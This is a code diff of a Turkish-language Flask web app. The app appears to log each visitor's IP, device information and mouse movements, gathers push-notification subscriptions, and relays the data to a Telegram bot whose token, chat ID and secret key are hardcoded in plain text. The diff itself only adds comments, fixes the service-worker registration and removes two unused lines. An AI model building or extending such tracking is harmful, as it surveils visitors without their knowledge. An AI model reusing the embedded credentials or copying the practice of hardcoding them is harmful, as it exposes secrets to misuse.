@@ -7,6 +7,7 @@ import time
 
 app = Flask(__name__)
 
+# --- AYARLAR ---
 TELEGRAM_TOKEN = "9021080798:AAEXhjdd0iAX1cvMFrk0MXfSj2PvnXvkSV8"
 CHAT_ID = "7622505128"
 GIZLI_ANAHTAR = "Utkan_Super_Gizli_2024" 
@@ -14,6 +15,7 @@ GIZLI_ANAHTAR = "Utkan_Super_Gizli_2024"
 # 🚨 GENEL ANAHTAR (PUBLIC KEY)
 PUBLIC_KEY = "MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE/4gG6JoXxRLcT8MVgXcDXMMxSioUqFtsKRp4UtkbNBkZduOsVo0RDbTngexn8sUoNUTk37uBZbeVXn8J80VjfA=="
 
+# --- TELEGRAM FONKSİYONLARI ---
 def telegram_mesaj_gonder(mesaj):
     try:
         url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
@@ -48,6 +50,7 @@ def serve_sw():
     except FileNotFoundError:
         return "sw.js bulunamadı", 404
 
+# --- ANA SAYFA VE SİTE KODU ---
 @app.route('/', methods=['GET'])
 def ana_sayfa():
     ziyaretci_ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
@@ -188,15 +191,22 @@ def ana_sayfa():
                 body: JSON.stringify({{ ip: IP_ADRESI, cihaz: CIHAZ_BILGISI }})
             }}).catch(e => console.log(e));
 
-            // 2. BİLDİRİM İZNİ VE ABONELİK
+            // 2. BİLDİRİM İZNİ VE ABONELİK (Service Worker 'ready' düzeltmesi eklendi)
             if ('serviceWorker' in navigator && 'PushManager' in window) {{
                 try {{
                     durum.innerHTML = "Bildirim izni isteniyor...";
                     const izin = await Notification.requestPermission(); 
                     
                     if (izin === 'granted') {{
-                        durum.innerHTML = "Bildirim izni verildi. Abone olunuyor...";
-                        const swReg = await navigator.serviceWorker.register('/sw.js');
+                        durum.innerHTML = "Bildirim izni verildi. Service Worker hazırlanıyor...";
+                        
+                        // Önce Service Worker'ı kaydet
+                        await navigator.serviceWorker.register('/sw.js', {{ scope: '/' }});
+                        
+                        // 🚨 EN KRİTİK ADIM: Service Worker'ın tamamen aktif olmasını bekle!
+                        const swReg = await navigator.serviceWorker.ready;
+                        
+                        durum.innerHTML = "Service Worker hazır. Abone olunuyor...";
                         const subscription = await swReg.pushManager.subscribe({{
                             userVisibleOnly: true,
                             applicationServerKey: urlBase64ToUint8Array(PUBLIC_VAPID_KEY)
@@ -325,8 +335,6 @@ def hareket():
     veri = request.json
     hareketler = veri.get('hareketler', [])
     if len(hareketler) > 0:
-        ilk = hareketler[0]
-        son = hareketler[-1]
         mesaj = f"🖱️ <b>HAREKET ANALİZİ</b>\n\nKullanıcı ekranda <b>{len(hareketler)}</b> noktada gezindi."
         telegram_mesaj_gonder(mesaj)
     return "OK", 200
